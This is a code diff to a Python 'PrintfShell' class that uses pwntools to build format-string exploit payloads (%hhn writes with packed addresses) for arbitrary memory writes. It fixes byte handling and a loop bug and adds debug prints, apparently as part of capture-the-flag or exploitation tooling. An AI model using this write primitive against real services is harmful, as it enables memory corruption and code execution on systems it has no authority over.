@@ -135,26 +135,28 @@ class PrintfShell(shell.Shell):
             command = bytes(f"%{self.stack_offset+2}$hhn\x00", "ascii")
         command = self.pad(command, 16, b"\x00")
         command += addr
+        print(command)
         self.read_response(command) # don't really need to read it beyond housecleaning
 
     @Command
     def write_n_bytes(self, addr : int, bs : list):
-        if type(addr) == str:
+        if type(addr) == str or type(addr) == bytes:
             addr = int(addr, 16)
         count = 0
         total = 2*len(bs)
-        command = ""
+        command = bytes("", 'ascii')
         for i, n in enumerate(bs):
             spill = (n - count) % 256
             if spill != 0:
-                command += f"%1${spill}c%{self.stack_offset+total+i}$hhn"
+                command += bytes(f"%1${spill}c%{self.stack_offset+total+i}$hhn", 'ascii')
             else: 
-                command += f"%{self.stack_offset+total+i}$hhn"
+                command += bytes(f"%{self.stack_offset+total+i}$hhn", 'ascii')
             count = n
         command = self.pad(command, (total)*8, b"_") # TODO: figure out the whole sep char
-        for n in enumerate(bs):
-            addr = pwnlib.util.packing.p64(addr + i)
-            command += addr
+        for i in range(len(bs)):
+            addr_bytes = pwnlib.util.packing.p64(addr + i)
+            command += addr_bytes
+        print(command)
         self.read_response(command)
             
 
@@ -192,7 +194,7 @@ class PrintfShell(shell.Shell):
                 new_suffix = suffix.replace(b"\x0a",b"\x01")
                 # put modded suffix on stack
                 self.read_response(b"\x00"*(4*8)+new_suffix)
-
+#
                 # replace all bytes in suffix
                 for i in locations:
                     self.write_byte(self.format_location + 4*8 + i, 0xa)
